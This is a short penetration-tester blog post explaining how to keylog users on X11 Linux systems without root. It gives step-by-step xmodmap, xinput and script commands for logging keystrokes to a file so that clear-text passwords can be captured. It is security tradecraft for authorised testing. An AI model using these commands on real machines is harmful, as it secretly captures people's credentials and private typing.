---
layout: post
title: Natively Keylogging *NIX Systems
date: '2016-06-21T21:32:00.003-06:00'
author: Sanjiv Kawa
tags:
- UNIX
- X11
- Linux
- Keylogging
- xinput
- Keylogger
- Ubuntu
- xmodmap
comments: true
---
I recently conducted a penetration test for a client that has rich \*NIX environment. After obtaining user access to several workstations, it was apparent that access to the interesting areas of the network required retrieving clear text passwords from users password database files.

The compromised systems did not have any misconfigurations or service vulnerabilities, so privilege escalation opportunities were few and far between. This makes executing most readily available \*NIX keylogger binaries ineffective.

I spent some time researching alternative ways to obtain keystrokes and discovered that it is possible to capture users typing directly to the keyboard using xinput. The best part is that this can be achieved with regular user privileges and with native tools.

Here is a video as well as some textual steps.

<iframe width="560" height="315" src="//www.youtube.com/embed/l09BEQ8FAAo" frameborder="0"> </iframe>

I like to create a new screen in situations like this, so the first step is:
{% highlight css %}
screen -S keylogger
{% endhighlight %}

I then sorted out some X11 display pre-requisites and grabbed the keycode to character legend. This is so that strokes can be translated from a keycode integer value to alphabetical character.
{% highlight css %}
export DISPLAY=:0.0
export | grep DIS

xmodmap -pke > xmodmap-pke.txt
{% endhighlight %}

Next step was to identify the input ID for the keyboard and use script to capture the real time strokes to file.
{% highlight css %}
xinput list

script -c "xinput test 8" -a xinput-keylogger.log
{% endhighlight %}

My co-worker <a href="http://porterhau5.com/about/">Tom Porter</a> and I are working on putting together a parser that shifts correctly to account for lowercase and uppercase characters. Some other thoughts are real-time parsing, or slightly delayed parsing so that post-processing is avoided all together.

<figure>
  <center>
  <img src ="https://4.bp.blogspot.com/-UkRf5m_3IjA/V2oEcqvBETI/AAAAAAAACC0/mM6njLJ4fM0ApagSM47W85uwi8WGw2ITQCLcB/s1600/Screen%2BShot%2B2016-06-21%2Bat%2B11.12.24%2BPM.png">
  </center>
</figure>
**Update:** Here is a link to the <a href="https://github.com/porterhau5/xkeyscan/blob/master/xkeyscan.py">parser</a> Tom put together.
